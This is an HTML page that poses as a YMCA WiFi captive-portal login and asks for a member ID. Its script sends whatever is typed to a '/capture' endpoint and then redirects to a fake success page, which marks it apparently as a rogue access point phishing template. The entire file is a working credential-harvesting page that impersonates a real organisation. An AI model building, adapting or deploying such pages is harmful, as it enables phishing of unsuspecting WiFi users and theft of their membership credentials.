<!DOCTYPE html>
<html><head><meta charset="UTF-8"><title>YMCA WiFi</title><style>*{margin:0;padding:0}body{font-family:Arial;background:linear-gradient(135deg,#E31837,#004B87);display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px}.container{background:white;border-radius:10px;max-width:400px;width:100%;padding:40px 30px}.logo h1{color:#E31837;font-size:28px;text-align:center;margin-bottom:30px}.form-group{margin-bottom:20px}label{display:block;margin-bottom:8px;color:#555;font-weight:500}input{width:100%;padding:12px;border:2px solid #ddd;border-radius:5px}input:focus{outline:none;border-color:#E31837}button{width:100%;padding:14px;background:#E31837;color:white;border:none;border-radius:5px;font-weight:bold;cursor:pointer}</style></head><body><div class="container"><div class="logo"><h1>YMCA</h1></div><form id="loginForm"><div class="form-group"><label>Member ID</label><input type="text" id="memberid" required placeholder="12345678"></div><button type="submit">Connect</button></form></div><script>document.getElementById('loginForm').addEventListener('submit',function(e){e.preventDefault();const memberid=document.getElementById('memberid').value;console.log('[YMCA] Member ID:',memberid);fetch('/capture',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({portal:'YMCA',memberid:memberid})}).catch(err=>console.log(err));window.location.href='success.html';});</script></body></html>
